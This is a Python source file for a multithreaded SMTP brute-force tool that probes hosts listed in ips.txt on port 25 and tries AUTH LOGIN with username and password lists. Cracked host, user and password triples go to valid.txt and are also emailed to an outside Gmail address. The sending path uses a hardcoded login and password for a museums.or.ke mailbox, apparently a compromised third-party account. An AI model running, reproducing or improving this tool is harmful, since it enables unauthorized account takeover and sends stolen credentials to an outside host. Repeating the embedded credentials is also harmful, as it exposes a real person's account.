import socket
import sys
import base64
import threading
import queue
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import logging

# --- SMTP CONFIGURATION (EDIT THESE) ---
SMTP_SERVER = "mail.museums.or.ke"
SMTP_PORT = 587
SMTP_USER = "okioko@museums.or.ke"
SMTP_PASS = "onesmus@2022"
NOTIFY_EMAIL = "skkho87.sm@gmail.com"
# ---------------------------------------

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smtp_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize files if 'a' argument is provided
if len(sys.argv) > 1 and str(sys.argv[1]) == 'a':
    with open('ips.txt', 'a', encoding='utf-8'):
        pass
    with open('users.txt', 'a', encoding='utf-8'):
        pass
    with open('pass.txt', 'a', encoding='utf-8'):
        pass
    logger.info("Initialized input files")
    sys.exit(1)

# Validate command line arguments
if len(sys.argv) != 4:
    print("Usage: python smtp_scanner.py <threads> <verbose> <debug>")
    print("Example: python smtp_scanner.py 10 bad d1")
    sys.exit(1)

try:
    ThreadNumber = int(sys.argv[1])
    Verbose = str(sys.argv[2])
    Dbg = str(sys.argv[3])
except ValueError:
    logger.error("Invalid thread number provided")
    sys.exit(1)

# Initialize output files
bad = open('bad.txt', 'w', encoding='utf-8')
val = open('valid.txt', 'a', encoding='utf-8')
live_servers = open('live_smtp_servers.txt', 'a', encoding='utf-8')

# Load already cracked hosts to avoid duplicates
cracked = []
try:
    with open('valid.txt', 'r', encoding='utf-8') as vff:
        alreadycracked = vff.read().splitlines()
        if len(alreadycracked) > 0:
            for bruted in alreadycracked:
                if ' ' in bruted:
                    cracked.append(bruted.split(" ")[0])
except FileNotFoundError:
    logger.info("No existing valid.txt file found")

# Load subdomain list
subs = []
try:
    with open('subs.txt', 'r', encoding='utf-8') as sf:
        subs = sf.read().splitlines()
except FileNotFoundError:
    logger.warning("subs.txt not found, using default subdomain handling")
    subs = ['.com', '.org', '.net', '.edu', '.gov']

def GetDomainFromBanner(banner):
    """Extract domain from SMTP banner"""
    try:
        if banner.startswith("220 "):
            TempBanner = banner.split(" ")[1]
        elif banner.startswith("220-"):
            TempBanner = banner.split(" ")[0].split("220-")[1]
        else:
            TempBanner = banner
        
        FirstDomain = TempBanner.rstrip()
        
        # Check for known subdomains
        for sd in subs:
            if FirstDomain.endswith(sd):
                LastDomain = ".".join(FirstDomain.split(".")[-3:])
                return LastDomain
        
        # Default to last two parts
        LastDomain = ".".join(FirstDomain.split(".")[-2:])
        return LastDomain
    except Exception as e:
        logger.error(f"Error parsing banner: {e}")
        return "unknown.domain"

def send_email_notification(subject, body):
    """Send email notification for important findings"""
    try:
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = SMTP_USER
        msg['To'] = NOTIFY_EMAIL
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
        server.quit()
        logger.info(f"Email notification sent: {subject}")
        return True
    except Exception as e:
        logger.error(f"Failed to send email notification: {e}")
        return False

def check_smtp_live(host, timeout=10):
    """Check if SMTP server is live and responding"""
    try:
        S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        S.settimeout(timeout)
        S.connect((host, 25))
        banner = S.recv(1024).decode(errors='ignore')
        S.close()
        
        if banner[:3] == '220':
            return True, banner.strip()
        return False, banner.strip()
    except Exception as e:
        return False, str(e)

class SMTPScanner(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            Host, user, passwd = self.queue.get()
            self.scan_host(Host, user, passwd)
            self.queue.task_done()

    def scan_host(self, host, user, passwd):
        try:
            # Skip if already processed
            if host in cracked:
                return False

            # First, check if SMTP server is live
            is_live, banner_info = check_smtp_live(host)
            
            if not is_live:
                if Verbose == 'bad':
                    bad.write(f"{host} - Not responding\n")
                    bad.flush()
                return False
            
            # Log live server
            live_servers.write(f"{host} - {banner_info}\n")
            live_servers.flush()
            
            # Send notification for live SMTP server
            subject = f"Live SMTP Server Found: {host}"
            body = f"Host: {host}\nBanner: {banner_info}\nTimestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            send_email_notification(subject, body)
            
            if Dbg in ["d1", "d3", "d4"]:
                print(f"[LIVE] {host} - {banner_info}")

            # Now attempt authentication if credentials provided
            if user and passwd:
                auth_result = self.test_authentication(host, user, passwd, banner_info)
                if auth_result:
                    cracked.append(host)
                    return True
            
            return True
            
        except Exception as e:
            if Dbg in ["d2", "d3"]:
                logger.error(f"Error scanning {host}: {e}")
            return False

    def test_authentication(self, host, user, passwd, banner):
        """Test SMTP authentication"""
        try:
            S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            S.settimeout(15)
            S.connect((host, 25))
            
            # Read banner
            banner_response = S.recv(1024).decode(errors='ignore')
            if banner_response[:3] != '220':
                S.close()
                return False

            # Send EHLO
            S.send(b'EHLO scanner\r\n')
            data = S.recv(2048).decode(errors='ignore')
            if '250' not in data:
                S.send(b'QUIT\r\n')
                S.close()
                return False

            # Get domain from banner
            dom = GetDomainFromBanner(banner)
            userd = f"{user}@{dom}"
            
            # Try each password
            for pwd in passwd.split("|"):
                pwd2 = pwd
                if "%user%" in pwd:
                    pwd2 = pwd.replace("%user%", user)
                if "%User%" in pwd:
                    pwd2 = pwd.replace("%User%", user.title())
                
                # Reset connection
                S.send(b'RSET\r\n')
                S.recv(256)
                
                # Attempt AUTH LOGIN
                S.send(b'AUTH LOGIN\r\n')
                data = S.recv(256).decode(errors='ignore')
                if data[:3] != '334':
                    break
                
                if Dbg in ["d1", "d3"]:
                    print(f"[AUTH] Testing {host} {userd} {pwd2}")

                # Send username
                S.send(base64.b64encode(userd.rstrip().encode()) + b'\r\n')
                S.recv(256)
                
                # Send password
                S.send(base64.b64encode(pwd2.encode()) + b'\r\n')
                data = S.recv(256).decode(errors='ignore')
                
                if data[:3] == '235':
                    # Authentication successful
                    logger.info(f"Valid credentials found: {host} {userd} {pwd2}")
                    val.write(f"{host} {userd} {pwd2}\n")
                    val.flush()
                    
                    # Send email notification for valid credentials
                    subject = "Valid SMTP Credentials Found"
                    body = f"Host: {host}\nUser: {userd}\nPassword: {pwd2}\nBanner: {banner}\nTimestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                    send_email_notification(subject, body)
                    
                    S.send(b'QUIT\r\n')
                    S.close()
                    return True
            
            S.send(b'QUIT\r\n')
            S.close()
            return False
            
        except Exception as e:
            logger.error(f"Authentication test failed for {host}: {e}")
            return False

def main(users, passwords, thread_number):
    """Main scanning function"""
    logger.info(f"Starting SMTP scanner with {thread_number} threads")
    
    q = queue.Queue(maxsize=40000)
    
    # Start worker threads
    for i in range(thread_number):
        try:
            t = SMTPScanner(q)
            t.daemon = True
            t.start()
        except Exception as e:
            logger.error(f"Couldn't start {thread_number} threads! Started {i} instead!")
            break
    
    # Load hosts and add to queue
    try:
        with open('ips.txt', 'r', encoding='utf-8') as hosts_file:
            hosts = hosts_file.read().splitlines()
            
        total_combinations = len(hosts) * len(users) * len(passwords)
        logger.info(f"Processing {total_combinations} combinations across {len(hosts)} hosts")
        
        for passwd in passwords:
            for user in users:
                for host in hosts:
                    if host.strip():  # Skip empty lines
                        q.put((host.strip(), user, passwd))
    
    except FileNotFoundError:
        logger.error("ips.txt file not found!")
        return
    
    # Wait for all tasks to complete
    q.join()
    logger.info("Scanning completed")

if __name__ == "__main__":
    # Load input files
    try:
        with open('users.txt', 'r', encoding='utf-8') as uf:
            users = [line.strip() for line in uf.read().splitlines() if line.strip()]
        
        with open('pass.txt', 'r', encoding='utf-8') as pf:
            passwords = [line.strip() for line in pf.read().splitlines() if line.strip()]
        
        if not users:
            logger.warning("No users loaded, using empty user for live server detection only")
            users = ['']
        
        if not passwords:
            logger.warning("No passwords loaded, using empty password for live server detection only")
            passwords = ['']
        
        logger.info(f"Loaded {len(users)} users and {len(passwords)} passwords")
        
        # Start main scanning
        main(users, passwords, ThreadNumber)
        
    except FileNotFoundError as e:
        logger.error(f"Required file not found: {e}")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    finally:
        # Close file handles
        bad.close()
        val.close()
        live_servers.close()